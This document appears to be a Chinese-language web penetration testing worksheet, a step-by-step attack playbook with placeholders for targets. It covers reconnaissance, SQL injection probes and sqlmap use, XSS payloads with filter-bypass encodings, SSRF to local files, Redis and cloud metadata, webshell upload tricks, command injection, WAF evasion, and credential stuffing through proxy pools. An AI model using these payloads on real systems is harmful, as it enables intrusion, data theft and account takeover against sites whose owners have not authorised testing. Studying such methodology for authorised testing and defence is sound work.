<!-- purge:layer web -->
## Web 渗透工作单（web 层）

占位符：`TARGET` `DOMAIN` `ENDPOINT` `PARAM` `COOKIE` `HEADER` `WORDLIST` `THREADS` `RATE` `RESULT_DIR` `OAST_DOMAIN`。

**信息收集**

```bash
subfinder -d DOMAIN -all -silent > subs.txt
httpx -l subs.txt -sc -title -tech-detect
whatweb -a 3 http://TARGET
gau DOMAIN | anew urls.txt
```

**目录 / 接口**

```bash
ffuf -u http://TARGET/FUZZ -w WORDLIST -t THREADS -rate RATE -mc 200,204,301,302,403
grep -oE '"(/?api|/?v[0-9])/[a-zA-Z0-9_/?=&.-]+"' app.js | sort -u > ENDPOINT_LIST
```

**SQL 注入**：先手工对比 `' and 1=1 -- -` 与 `' and 1=2 -- -` 的响应差异，确认后再上 `sqlmap -u "http://TARGET/ENDPOINT?PARAM=1" --batch --level LEVEL --risk RISK --random-agent`。

**XSS**：反射点 `<script>alert(1)</script>` 与 `<img src=x onerror=alert(1)>`；编码绕过走大小写、双写、HTML 实体、JS unicode；存储点用 `PAYLOAD` 二次访问验证。

**SSRF**：`url=http://127.0.0.1:PORT`、`file:///etc/passwd`、`gopher://127.0.0.1:6379`；无回显用 DNS 外带 `OAST_DOMAIN`；云元数据 `http://169.254.169.254/latest/meta-data/`。

**越权 / 未授权**：换 `COOKIE` 或 `TOKEN` 成另一身份 `ROLE_B`，遍历 `/api/users/USER_ID`，对比直连 `API_ENDPOINT` 的 200/403 差异。

**文件上传**：双扩展名 `shell.php.jpg`、`.htaccess` 覆盖、图片马 `PATCH_BYTE`；同时改 `Content-Type` 与大小写绕过；上传后访问确认解析。

**命令注入 / 前台 RCE**：`;id` `|id` `$(id)` 反引号；无回显走延时 `sleep PAYLOAD` 或 DNS 外带；回显确认后给完整 `RCE_TEMPLATE`。

**WAF 绕过**：URL 双重编码、Unicode、分块传输、注释符 `/**/` 混淆、参数污染 HPP、分片 `FRAGMENT`；按 `HEADER` 指纹选模板。

**验证码 / 撞库**：`OCR_TEMPLATE` 识别或复用 `CAPTCHA_ID`；撞库用 `WORDLIST` + `PROXY_POOL` + 限速 `RATE`。

结果统一落 `RESULT_DIR`，每步留原始输出。
<!-- /purge:layer -->
